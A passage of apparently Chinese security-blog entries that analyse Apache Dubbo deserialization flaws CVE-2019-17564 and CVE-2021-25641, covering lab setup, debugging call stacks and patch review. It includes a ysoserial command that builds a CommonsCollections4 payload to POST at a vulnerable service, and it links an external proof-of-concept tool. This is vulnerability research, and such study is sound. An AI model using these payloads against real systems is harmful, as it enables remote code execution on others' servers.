rel="noopener">https://github.com/apache/dubbo-samples</a></p><p>当前下载的项目Dubbo版本是2.7.7，直接修改pom中的<code>dubbo.version</code>为漏洞版本是会引起maven错误的，直接在dubbo对应的dependency标签中的添加<code>&lt;version&gt;2.7.3&lt;/version&gt;</code>即可：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/1.png" alt=""></p><p>接着，因为默认项目中是没有已知的可利用Gadget的，需要在pom中添加CC链依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下载zookeeper到本地，运行服务端，默认监听地址<code>0.0.0.0:2181</code>。</p><p>然后运行即可。如果显示http端口被占用，在http-provider.xml中修改一下监听的端口号即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"http"</span> <span class="attr">id</span>=<span class="string">"http"</span> <span class="attr">port</span>=<span class="string">"$&#123;servlet.port:8081&#125;"</span> <span class="attr">server</span>=<span class="string">"$&#123;servlet.container:tomcat&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>正常跑起来，其中会显示Dubbo Provider注册到Register中的HTTP服务名：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/3.png" alt=""></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>一般攻击者是需要通过向Register查询才知道Dubbo Provider对外提供了哪些接口服务的。</p><p>这里用zookeeper的客户端直接连接查询：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zkCli.cmd -server <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">2181</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/4.png" alt=""></p><p>获取到Dubbo Provider对外接口为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.samples.http.api.DemoService</span><br></pre></td></tr></table></figure><p>使用ysoserial工具生成CC4链的payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span>.<span class="number">6</span>-SNAPSHOT-all.jar CommonsCollections4 <span class="string">"calc.exe"</span> &gt; dubbo.poc</span><br></pre></td></tr></table></figure><p>将payload POST到Dubbo Provider目标接口即可触发漏洞：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/2.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><p>根据前面的报错栈信息，在HttpInvokerServiceExporter类的readRemoteInvocation()函数中打上断点直接调试。</p><p>首先HttpServlet在处理请求分发时会调用到org/apache/dubbo/remoting/http/servlet/DispatcherServlet类的service()函数，其中会尝试获取HttpHandler，若handler对象为null即找不到目标服务时就会返回404，反之进一步调用handler对象的handle()函数来处理请求：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/5.png" alt=""></p><p>跟进，获取URI后，然后Dubbo是使用spring-web中的HttpInvokerServiceExporter类对象skeleton来获取对应的，判断如果请求方式不是POST则直接响应500，是的话则直接设置RPC远程服务地址，然后调用HttpInvokerServiceExporter类对象skeleton的handleRequest()函数进一步处理请求，这里Content-Type为<code>application/x-java-serialized-object</code>即Java序列化数据类型：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/6.png" alt=""></p><p>往下，就进入到Spring框架的HttpInvokerServiceExporter类的handleRequest()函数中，然后调用到doReadRemoteInvocation()函数，其中调用readObject()函数对POST内容进行Java原生反序列化操作：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/7.png" alt=""></p><p>再往下就是Java原生反序列化触发CC4链的过程：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/8.png" alt=""></p><p>此时函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">transform:124, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:112, ChainedTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:81, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1185, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2234, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2125, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1624, ObjectInputStream (java.io)</span><br><span class="line">readObject:464, ObjectInputStream (java.io)</span><br><span class="line">readObject:422, ObjectInputStream (java.io)</span><br><span class="line">doReadRemoteInvocation:144, RemoteInvocationSerializingExporter (org.springframework.remoting.rmi)</span><br><span class="line">readRemoteInvocation:121, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">readRemoteInvocation:100, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">handleRequest:79, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)</span><br><span class="line">handle:216, HttpProtocol$InternalHandler (org.apache.dubbo.rpc.protocol.http)</span><br><span class="line">service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)</span><br><span class="line">service:790, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:198, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:140, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:342, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:803, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:66, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1468, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>Spring框架官方也有在文档中提到可能存在Java反序列化漏洞：<a href="https://docs.spring.io/spring-framework/docs/5.1.0.RELEASE/spring-framework-reference/integration.html#remoting-httpinvoker" target="_blank" rel="noopener">https://docs.spring.io/spring-framework/docs/5.1.0.RELEASE/spring-framework-reference/integration.html#remoting-httpinvoker</a></p><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>官方在后续版本中是将Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类替换成了<code>com\googlecode\jsonrpc4j\JsonRpcServer</code>类进行处理。</p><p>这里换个2.7.5版本测试。由于JsonRpcServer.handle()中无法处理Java序列化数据，因此是不存在类似Spring的HttpInvokerServiceExporter类中的反序列化漏洞的：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/9.png" alt=""></p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/10.png" alt=""></p><p>正常报文看下，通信的数据类型变成JSON格式了：</p><p><img src="/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/11.png" alt=""></p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="http://www.lmxspace.com/2020/02/16/Apache-Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/" target="_blank" rel="noopener">Apache Dubbo反序列化漏洞（CVE-2019-17564）</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Dubbo" scheme="https://www.mi1k7ea.com/tags/Dubbo/"/>
    
  </entry>
  
  <entry>
    <title>浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）</title>
    <link href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/</id>
    <published>2021-06-30T04:57:38.000Z</published>
    <updated>2021-07-03T09:10:21.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习下最近爆出的Dubbo漏洞。</p><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>Dubbo Provider即服务提供方默认使用dubbo协议来进行RPC通信，而dubbo协议默认是使用Hessian2序列化格式进行对象传输的，但是针对Hessian2序列化格式的对象传输可能会有黑白名单设置的限制，参考：<a href="https://github.com/apache/dubbo/pull/6378" target="_blank" rel="noopener">https://github.com/apache/dubbo/pull/6378</a></p><p>针对这种场景，攻击者可以通过更改dubbo协议的第三个flag位字节来更改为使用Kryo或FST序列化格式来进行Dubbo Provider反序列化攻击从而绕过针对Hessian2反序列化相关的限制来达到RCE。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><ul><li>Dubbo 2.7.0 to 2.7.8</li><li>Dubbo 2.6.0 to 2.6.9</li><li>Dubbo all 2.5.x versions (not supported by official team any longer)</li></ul><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p><a href="https://github.com/apache/dubbo-spring-boot-project" target="_blank" rel="noopener">https://github.com/apache/dubbo-spring-boot-project</a></p><p>下载2.7.3版本，添加Dubbo-Common依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.dubbo/dubbo-common --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意，dubbo-common必须&lt;=2.7.3版本。</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>恶意FST/Kryo序列化请求构造工具：<a href="https://github.com/Dor-Tumarkin/CVE-2021-25641-Proof-of-Concept" target="_blank" rel="noopener">https://github.com/Dor-Tumarkin/CVE-2021-25641-Proof-of-Concept</a></p><p>冲：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/1.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><h3 id="Kryo反序列化"><a href="#Kryo反序列化" class="headerlink" title="Kryo反序列化"></a>Kryo反序列化</h3><p>在DecodeableRpcInvocation类的decode()函数中，通过serializationType为8、获取到反序列化器Kryo，然后调用readUTF()函数来读取dubbo协议对应的字段信息如dubbo协议版本、服务名称、服务版本、方法名、方法参数类型等：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/2.png" alt=""></p><p>提取方法参数类型为类数组后，再循坏对参数进行Kryo反序列化：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/3.png" alt=""></p><p>从input中读取解析到type为HashMap，因此会调用Kryo的MapSerializer序列化器来读取input中的信息：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/4.png" alt=""></p><p>其中会将解析到的key和value都通过调用map.put()来放入HashMap对象中，这里是有两对键值对放进去了：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/5.png" alt=""></p><p>往下putVal()函数中会调用key即XString类的equals()函数来判断两个key值是否相等：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/7.png" alt=""></p><p>这其中就会调用参数类的toString()函数，这里是com/alibaba/fastjson/JSON类的toString()函数，进而调用JSONSerializer的write()函数，从而触发Fastjson Gadget：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/8.png" alt=""></p><p>最后，就是TemplatesImpl链的触发点了：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/6.png" alt=""></p><p>此时函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:280, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSONString:863, JSON (com.alibaba.fastjson)</span><br><span class="line">toString:857, JSON (com.alibaba.fastjson)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:104, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:635, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">read:162, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:39, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:813, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)</span><br><span class="line">readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)</span><br><span class="line">decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:682, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:496, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)</span><br><span class="line">run:74, ThreadExecutorMap$2 (io.netty.util.internal)</span><br><span class="line">run:30, FastThreadLocalRunnable (io.netty.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="FTS反序列化"><a href="#FTS反序列化" class="headerlink" title="FTS反序列化"></a>FTS反序列化</h3><p>FTS反序列化也是类似的触发原理。</p><p>通过serializationType为9，获取到FST反序列化器进行反序列化操作：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/9.png" alt=""></p><p>在FST反序列化过程中，也是将反序列化后的键值对put到HashMap对象中：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/10.png" alt=""></p><p>往下是和Kryo一样的调用过程，即XString类的equals()函数中调用参数的toString触发Fastjson Gadget。</p><p>此时函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:280, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSONString:863, JSON (com.alibaba.fastjson)</span><br><span class="line">toString:857, JSON (com.alibaba.fastjson)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:104, HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal:635, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">instantiate:79, FSTMapSerializer (org.nustaq.serialization.serializers)</span><br><span class="line">instantiateAndReadWithSer:497, FSTObjectInput (org.nustaq.serialization)</span><br><span class="line">readObjectWithHeader:366, FSTObjectInput (org.nustaq.serialization)</span><br><span class="line">readObjectInternal:327, FSTObjectInput (org.nustaq.serialization)</span><br><span class="line">readObject:307, FSTObjectInput (org.nustaq.serialization)</span><br><span class="line">readObject:102, FstObjectInput (org.apache.dubbo.common.serialize.fst)</span><br><span class="line">decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:682, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:496, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)</span><br><span class="line">run:74, ThreadExecutorMap$2 (io.netty.util.internal)</span><br><span class="line">run:30, FastThreadLocalRunnable (io.netty.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>本地以2.7.9版本测试。</p><p>在高版本中已将com.esotericsoftware:kryo依赖去掉了，在使用Kryo序列化器进行反序列化获取KryoObjectInput对象时会报找不到KryoException类的错误：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/11.png" alt=""></p><p>添加上对应的依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.esotericsoftware/kryo --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.esotericsoftware<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- https://mvnrepository.com/artifact/de.javakaffee/kryo-serializers --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.javakaffee<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo-serializers<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.43<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其实就是CVE-2020-1948的补丁过滤拦截了：</p><p><img src="/2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/12.png" 